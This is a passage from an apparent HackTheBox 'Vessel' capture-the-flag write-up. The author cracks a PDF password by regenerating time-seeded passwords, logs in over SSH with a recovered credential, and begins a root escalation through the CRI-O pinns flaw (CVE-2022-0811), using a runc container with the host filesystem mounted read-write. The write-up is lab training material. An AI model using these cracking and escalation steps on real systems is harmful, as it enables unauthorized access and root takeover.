font-style: inherit;">loop</span> nr. 88434 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> generated passwords: 999</span>
<span id="cb27-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">qrand:</span> 31376150</span>
<span id="cb27-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">loop</span> nr. 88435 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> generated passwords: 999</span>
<span id="cb27-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">qrand:</span> 31376150</span>
<span id="cb27-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">loop</span> nr. 88436 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> generated passwords: 999</span>
<span id="cb27-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">qrand:</span> 31424421</span>
<span id="cb27-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">loop</span> nr. 88437 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> generated passwords: 999</span>
<span id="cb27-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">qrand:</span> 31424421</span>
<span id="cb27-11"></span>
<span id="cb27-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel grep <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> 31376150 output.txt</span>
<span id="cb27-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">59669:qrand:</span> 31376150</span>
<span id="cb27-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">176871:qrand:</span> 31376150</span>
<span id="cb27-15"></span>
<span id="cb27-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel grep <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> 31424421 output.txt</span>
<span id="cb27-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">59671:qrand:</span> 31424421</span>
<span id="cb27-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">176873:qrand:</span> 31424421</span></code></pre></div>
<p>We could also verify this a bit easier by just writing <code>QTime.currentTime().msec()</code> to a variable and printing the variable.</p>
<p>Write a script to loop through 0 - 999 and generate a password based on the “loop number” to generate all possible passwords. Most of the code can just be taken from the original program.</p>
<div class="sourceCode" id="cb28" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel python3 genPws.py</span>
<span id="cb28-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb28-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">loop</span> nr. 998 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> generated passwords: 997</span>
<span id="cb28-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">loop</span> nr. 999 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> generated passwords: 998</span>
<span id="cb28-5"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">time</span> elapsed: 0.02527642250061035 seconds</span>
<span id="cb28-6"></span>
<span id="cb28-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel wc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-l</span> pw-list.txt </span>
<span id="cb28-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">999</span> pw-list.txt</span>
<span id="cb28-9"></span>
<span id="cb28-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel john <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--wordlist</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>pw-list.txt notes.hash </span>
<span id="cb28-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Using</span> default input encoding: UTF-8</span>
<span id="cb28-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Loaded</span> 1 password hash <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PDF</span> [MD5 SHA2 RC4/AES 32/64]<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb28-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Cost</span> 1 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">revision</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">is</span> 3 for all loaded hashes</span>
<span id="cb28-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Will</span> run 4 OpenMP threads</span>
<span id="cb28-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Press</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'q'</span> or Ctrl-C to abort, almost any other key for status</span>
<span id="cb28-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0g</span> 0:00:00:00 DONE <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-09-01</span> 18:53<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0g/s</span> 99900p/s 99900c/s 99900C/s 2J16^<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">vtXpN2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>o1H;e4f|FF0([y+|q..l2DoG^icl}&gt;kZ[tNB|:<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">m5km@{x:^7ck</span></span>
<span id="cb28-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Session</span> completed. </span>
<span id="cb28-18"></span>
<span id="cb28-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel john <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--show</span> notes.hash</span>
<span id="cb28-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span> password hashes cracked, 1 left</span></code></pre></div>
<p>Although everything is correct in theory, we’re not able to generate correct password.. this had me stumped for even more hours where I re-built the script a few times but without any luck. Then I decided to try the script on my Windows VM.</p>
<div class="sourceCode" id="cb29" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb29-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\void\Documents\htb\vessel<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> python3<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">7.</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">exe</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>\genPws<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">py</span></span>
<span id="cb29-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[...</span> snip <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...]</span></span>
<span id="cb29-3">loop nr<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">998</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> generated passwords<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">998</span></span>
<span id="cb29-4"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">loop</span> nr<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">999</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> generated passwords<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">999</span></span>
<span id="cb29-5"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">time</span> elapsed<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.14032745361328125</span> seconds</span></code></pre></div>
<p>Download my <strong>genPws.py</strong> script <a href="../../assets/scripts/vessel_genPws.py">HERE</a>.</p>
<p>Transfer the password file to Kali attack VM and BOOM! We’re able to crack the PDF. The problem is coming from <code>PySide2</code> behaving differently depending on OS. Don’t ask me how, or why, this I simply don’t know.</p>
<div class="sourceCode" id="cb30" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel john <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--wordlist</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>pw-list_windows.txt notes.hash</span>
<span id="cb30-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Using</span> default input encoding: UTF-8</span>
<span id="cb30-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Loaded</span> 1 password hash <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PDF</span> [MD5 SHA2 RC4/AES 32/64]<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb30-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Cost</span> 1 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">revision</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">is</span> 3 for all loaded hashes</span>
<span id="cb30-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Will</span> run 4 OpenMP threads</span>
<span id="cb30-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Press</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'q'</span> or Ctrl-C to abort, almost any other key for status</span>
<span id="cb30-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">YG7Q7RDzA+q</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ke~MJ8!yRzoI^VQxSqSS</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">notes.pdf</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>     </span>
<span id="cb30-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1g</span> 0:00:00:00 DONE <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-09-01</span> 19:01<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">100.0g/s</span> 38400p/s 38400c/s 38400C/s _jEkA+f0VXtWZ[K.d+EdaBAB<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">r]E3Z*..r6TUgox@Tb5JWnK5AHO}</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$AE</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">%8!d58Shq</span></span>
<span id="cb30-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Use</span> the <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"--show --format=PDF"</span> options to display all of the cracked passwords reliably</span>
<span id="cb30-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Session</span> completed. </span>
<span id="cb30-11"></span>
<span id="cb30-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel john <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--show</span> notes.hash                        </span>
<span id="cb30-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">notes.pdf:YG7Q7RDzA+q</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ke~MJ8!yRzoI^VQxSqSS</span></span>
<span id="cb30-14"></span>
<span id="cb30-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> password hash cracked, 0 left</span></code></pre></div>
</section>
<section id="step-7" class="level3">
<h3 class="anchored" data-anchor-id="step-7">Step 7</h3>
<p>Read the PDF and we find System Administrator <code>ethan</code>’s password - <code>b@mPRNSVTjjLKId1T</code></p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel12.png" class="img-fluid"></p>
<p>Login with SSH and grab <code>user.txt</code></p>
<div class="sourceCode" id="cb31" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel ssh ethan@vessel.htb </span>
<span id="cb31-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel.htb</span> password: b@mPRNSVTjjLKId1T</span>
<span id="cb31-3"></span>
<span id="cb31-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:~$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hostname</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> user.txt </span>
<span id="cb31-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb31-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vessel</span></span>
<span id="cb31-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">608191af90716a518c1483138b0b1ded</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>Some quick manual enumeration as user <code>ethan</code> and we find..</p>
<p>.. we’re unable to run anything as <code>root</code>:</p>
<div class="sourceCode" id="cb32" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:~$</span> sudo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-l</span></span>
<span id="cb32-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[sudo]</span> password for ethan: </span>
<span id="cb32-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sorry,</span> user ethan may not run sudo on vessel.</span></code></pre></div>
<p>.. nothing of use in <code>/opt</code>, <code>/tmp</code> or <code>/dev/shm</code></p>
<p>.. no unknown service running locally:</p>
<div class="sourceCode" id="cb33" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:~$</span> netstat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-tulpn</span></span>
<span id="cb33-2"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> all processes could be identified, non-owned process info</span>
<span id="cb33-3"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">will</span> not be shown, you would have to be root to see it all.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb33-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Active</span> Internet connections <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">only</span> servers<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb33-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span>
<span id="cb33-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:33060         0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb33-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:3306          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb33-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.53:53           0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                                   </span>
<span id="cb33-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:8000          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>   </span></code></pre></div>
<p>.. we are not part of any strange/interesting groups:</p>
<div class="sourceCode" id="cb34" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb34-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:~$</span> id</span>
<span id="cb34-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>.. interesting objects owned by group <code>ethan</code>:</p>
<div class="sourceCode" id="cb35" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/$</span> find / <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-group</span> ethan <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/null</span>
<span id="cb35-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/pinns</span></span>
<span id="cb35-3"></span>
<span id="cb35-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span> /usr/bin/pinns</span>
<span id="cb35-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwsr-x---</span> 1 root ethan 814936 Mar 15 18:18 /usr/bin/pinns</span></code></pre></div>
<p><code>/usr/bin/pinns</code> have the SUID bit set and is most likely our path to root, lets investigate more.</p>
<div class="sourceCode" id="cb36" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb36-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/$</span> /usr/bin/pinns</span>
<span id="cb36-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[pinns:e]:</span> Path for pinning namespaces not specified: Invalid argument</span>
<span id="cb36-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/$</span> /usr/bin/pinns <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--help</span></span>
<span id="cb36-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/$</span> /usr/bin/pinns <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-h</span></span></code></pre></div>
<p>Googling for <em>“Path for pinning namespaces”</em> we get two matches, both referencing <strong>CRI-O</strong>.</p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel13.png" class="img-fluid"></p>
<p><em>“CRI-O is&nbsp;<strong>an implementation of the Kubernetes CRI (Container Runtime Interface) to enable using OCI (Open Container Initiative) compatible runtimes</strong>. It is a lightweight alternative to using Docker as the runtime for kubernetes.”</em></p>
<p>Google <em>cri-o “pinns”</em> and the first article we find is one from CrowdStrike disclosing a vulnerability in CRI-O, <a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">CVE-2022-0811</a>. Some key information from the article:</p>
<ul>
<li><p><em>“Dubbed “cr8escape,” when invoked, an attacker could escape from a Kubernetes container and gain root access to the host and be able to move anywhere in the cluster.”</em></p></li>
<li><p><em>“.. discovered a flaw introduced in CRI-O version&nbsp;<a href="https://github.com/cri-o/cri-o/tree/v1.19.0/pinns/src">1.19</a>&nbsp;that allows an attacker to bypass these safeguards and set arbitrary kernel parameters on the host.”</em></p></li>
<li><p><em>“..&nbsp;anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime can abuse the “<a href="https://man7.org/linux/man-pages/man5/core.5.html">kernel.core_pattern</a>” parameter to achieve container escape and arbitrary code execution as root on any node in the cluster.”</em></p></li>
<li><p>A PoC on how to exploit this vulnerability with <code>kubectl</code></p></li>
</ul>
<div class="sourceCode" id="cb37" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/$</span> crio <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--version</span></span>
<span id="cb37-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">crio</span> version 1.19.6</span>
<span id="cb37-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Version:</span>       1.19.6</span>
<span id="cb37-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GitCommit:</span>     c12bb210e9888cf6160134c7e636ee952c45c05a</span>
<span id="cb37-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GitTreeState:</span>  clean</span>
<span id="cb37-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">BuildDate:</span>     2022-03-15T18:18:24Z</span>
<span id="cb37-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GoVersion:</span>     go1.15.2</span>
<span id="cb37-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Compiler:</span>      gc</span>
<span id="cb37-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Platform:</span>      linux/amd64</span>
<span id="cb37-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Linkmode:</span>      dynamic</span></code></pre></div>
<p>We’ve most definitely found the start towards root.</p>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>Reading about the exploit we should (1) create a pod/container, (2) use <code>pinns</code> to exploit the vulnerable variable <code>kernel.core_pattern</code>, (3) trigger a core dump and then reap the rewards</p>
<p>This is all easy in theory, but we don’t have <code>kubectl</code>, <code>minikube</code> or <code>docker</code> available. However we do have <code>runc</code>! <strong>(1)</strong> Follow the steps on <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation">HackTricks</a> to create a container.</p>
<div class="sourceCode" id="cb38" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Create location for runc filesystem</span></span>
<span id="cb38-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/$</span> mkdir /tmp/pthree</span>
<span id="cb38-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/$</span> mkdir /tmp/pthree/rootfs</span>
<span id="cb38-4"></span>
<span id="cb38-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Create runc configuration</span></span>
<span id="cb38-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp/pthree$</span> runc spec</span>
<span id="cb38-7"></span>
<span id="cb38-8"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Add following data under 'mounts' section of config.json</span></span>
<span id="cb38-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb38-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"type"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"bind"</span>,</span>
<span id="cb38-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"source"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/"</span>,</span>
<span id="cb38-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"destination"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/"</span>,</span>
<span id="cb38-13"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"options"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> [</span>
<span id="cb38-14"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"rbind"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb38-15"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"rw"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb38-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"rprivate"</span></span>
<span id="cb38-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span></span>
<span id="cb38-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">},</span></span>
<span id="cb38-19"></span>
<span id="cb38-20"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Start runc</span></span>
<span id="cb38-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp/pthree$</span> runc run privesc</span>
